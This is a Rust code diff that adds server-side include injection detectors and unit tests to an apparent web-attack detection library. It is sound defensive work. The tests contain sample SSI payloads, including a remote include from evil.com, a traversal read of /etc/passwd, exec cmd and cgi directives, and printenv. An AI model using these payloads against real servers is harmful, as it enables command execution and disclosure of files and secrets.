@@ -10,7 +10,171 @@
 use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
 use crate::types::InvariantClass;
 
+type RustDetection = L2Detection;
+
 pub struct SsiEvaluator;
+
+fn detect_ssi_remote_include(input: &str) -> Option<RustDetection> {
+    let lower = input.to_ascii_lowercase();
+
+    if let Some(pos) = lower.find("<!--#include") {
+        let window_end = lower.len().min(pos + 220);
+        let slice = &lower[pos..window_end];
+        let has_remote = (slice.contains("virtual='http://")
+            || slice.contains("virtual=\"http://")
+            || slice.contains("virtual='https://")
+            || slice.contains("virtual=\"https://"))
+            || (slice.contains("virtual='//") || slice.contains("virtual=\"//"));
+        let has_traversal_file = (slice.contains("file='") || slice.contains("file=\""))
+            && (slice.contains("../") || slice.contains("..\\"));
+        if has_remote || has_traversal_file {
+            return Some(RustDetection {
+                detection_type: "ssi_remote_include".into(),
+                confidence: 0.95,
+                detail: "SSI include directive references remote URL or traversal file path".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: input[pos..input.len().min(pos + 100)].to_string(),
+                    interpretation: "SSI include with attacker-controlled remote URL or traversal path can disclose files and execute server-side include fetch behavior.".into(),
+                    offset: pos,
+                    property: "SSI include directives must not accept untrusted input for virtual/file targets.".into(),
+                }],
+            });
+        }
+    }
+
+    None
+}
+
+fn detect_ssi_exec_cmd(input: &str) -> Option<RustDetection> {
+    let lower = input.to_ascii_lowercase();
+    if let Some(pos) = lower.find("<!--#exec") {
+        let window_end = lower.len().min(pos + 180);
+        let slice = &lower[pos..window_end];
+        if slice.contains("cmd='")
+            || slice.contains("cmd=\"")
+            || slice.contains("cgi='")
+            || slice.contains("cgi=\"")
+        {
+            return Some(RustDetection {
+                detection_type: "ssi_exec_cmd".into(),
+                confidence: 0.96,
+                detail: "SSI exec directive invokes cmd/cfg server-side execution".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: input[pos..input.len().min(pos + 100)].to_string(),
+                    interpretation: "SSI exec directive executes OS commands or CGI handlers when SSI is enabled.".into(),
+                    offset: pos,
+                    property: "Untrusted input must not contain SSI exec cmd/cfg directives.".into(),
+                }],
+            });
+        }
+    }
+    None
+}
+
+fn detect_ssi_env_disclosure(input: &str) -> Option<RustDetection> {
+    let lower = input.to_ascii_lowercase();
+    if let Some(pos) = lower.find("<!--#echo") {
+        let window_end = lower.len().min(pos + 180);
+        let slice = &lower[pos..window_end];
+        if slice.contains("var='") || slice.contains("var=\"") {
+            return Some(RustDetection {
+                detection_type: "ssi_env_disclosure".into(),
+                confidence: 0.88,
+                detail: "SSI echo variable disclosure pattern".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: input[pos..input.len().min(pos + 100)].to_string(),
+                    interpretation: "SSI echo var directive can leak server environment variables such as DOCUMENT_ROOT.".into(),
+                    offset: pos,
+                    property: "SSI variable echo directives must not be user-controllable.".into(),
+                }],
+            });
+        }
+    }
+
+    if let Some(pos) = lower.find("<!--#printenv") {
+        return Some(RustDetection {
+            detection_type: "ssi_env_disclosure".into(),
+            confidence: 0.88,
+            detail: "SSI printenv environment dump pattern".into(),
+            position: pos,
+            evidence: vec![ProofEvidence {
+                operation: EvidenceOperation::PayloadInject,
+                matched_input: input[pos..input.len().min(pos + 100)].to_string(),
+                interpretation: "SSI printenv dumps environment variables and may expose sensitive server configuration.".into(),
+                offset: pos,
+                property: "SSI printenv directives must be blocked from untrusted input.".into(),
+            }],
+        });
+    }
+
+    None
+}
+
+fn detect_ssi_obfuscated(input: &str) -> Option<RustDetection> {
+    let lower = input.to_ascii_lowercase();
+    let encoded_pos = lower
+        .find("%3c%21--")
+        .or_else(|| lower.find("%3c!--"))
+        .or_else(|| lower.find("%3c%21%2d%2d"))
+        .or_else(|| lower.find("<!--%23"));
+    if let Some(pos) = encoded_pos {
+        return Some(RustDetection {
+            detection_type: "ssi_obfuscated".into(),
+            confidence: 0.87,
+            detail: "Obfuscated SSI directive marker (encoded comment/directive start)".into(),
+            position: pos,
+            evidence: vec![ProofEvidence {
+                operation: EvidenceOperation::ContextEscape,
+                matched_input: input[pos..input.len().min(pos + 80)].to_string(),
+                interpretation: "Encoded SSI delimiters can bypass naive filters and be decoded server-side into executable directives.".into(),
+                offset: pos,
+                property: "Input must be normalized before SSI filtering, including URL-decoding.".into(),
+            }],
+        });
+    }
+
+    if let Some(pos) = lower.find('\0') {
+        if lower.contains("<!--#") || lower.contains("<!-- #") || lower.contains("%23") {
+            return Some(RustDetection {
+                detection_type: "ssi_obfuscated".into(),
+                confidence: 0.87,
+                detail: "SSI directive with null-byte obfuscation".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::ContextEscape,
+                    matched_input: input[pos..input.len().min(pos + 80)].to_string(),
+                    interpretation: "Null-byte injection can alter parser behavior and evade directive pattern matching.".into(),
+                    offset: pos,
+                    property: "Null bytes should be stripped before SSI directive validation.".into(),
+                }],
+            });
+        }
+    }
+
+    if let Some(pos) = lower.find("<!-- #include") {
+        return Some(RustDetection {
+            detection_type: "ssi_obfuscated".into(),
+            confidence: 0.87,
+            detail: "Whitespace-padded SSI directive marker".into(),
+            position: pos,
+            evidence: vec![ProofEvidence {
+                operation: EvidenceOperation::ContextEscape,
+                matched_input: input[pos..input.len().min(pos + 80)].to_string(),
+                interpretation: "Whitespace padding inside SSI directive markers can evade strict signature matching.".into(),
+                offset: pos,
+                property: "SSI matching should allow normalized whitespace and reject directive variants.".into(),
+            }],
+        });
+    }
+
+    None
+}
 
 impl L2Evaluator for SsiEvaluator {
     fn id(&self) -> &'static str {
@@ -153,6 +317,19 @@ impl L2Evaluator for SsiEvaluator {
             });
         }
 
+        if let Some(det) = detect_ssi_remote_include(&decoded) {
+            dets.push(det);
+        }
+        if let Some(det) = detect_ssi_exec_cmd(&decoded) {
+            dets.push(det);
+        }
+        if let Some(det) = detect_ssi_env_disclosure(&decoded) {
+            dets.push(det);
+        }
+        if let Some(det) = detect_ssi_obfuscated(input).or_else(|| detect_ssi_obfuscated(&decoded)) {
+            dets.push(det);
+        }
+
         dets
     }
 
@@ -225,5 +402,61 @@ mod tests {
         let eval = SsiEvaluator;
         let dets = eval.detect(r#"<esi:choose><esi:when test="$(HTTP_COOKIE{admin})==1">"#);
         assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_conditional"));
+    }
+
+    #[test]
+    fn detects_ssi_remote_http_include() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!--#include virtual='http://evil.com/shell.shtml'-->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_remote_include"));
+    }
+
+    #[test]
+    fn detects_ssi_file_traversal_include() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!--#include file='../../../../etc/passwd'-->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_remote_include"));
+    }
+
+    #[test]
+    fn detects_ssi_exec_cmd_variant() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!--#exec cmd='id'-->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_exec_cmd"));
+    }
+
+    #[test]
+    fn detects_ssi_exec_cgi_variant() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!--#exec cgi='/cgi-bin/attacker.cgi'-->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_exec_cmd"));
+    }
+
+    #[test]
+    fn detects_ssi_echo_env_disclosure() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!--#echo var='DOCUMENT_ROOT'-->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_env_disclosure"));
+    }
+
+    #[test]
+    fn detects_ssi_printenv_disclosure() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!--#printenv-->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_env_disclosure"));
+    }
+
+    #[test]
+    fn detects_ssi_encoded_obfuscation() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("%3C%21--%23include virtual='http://evil.com'");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_obfuscated"));
+    }
+
+    #[test]
+    fn detects_ssi_whitespace_obfuscation() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("<!-- #include virtual='/etc/passwd' -->");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_obfuscated"));
     }
 }
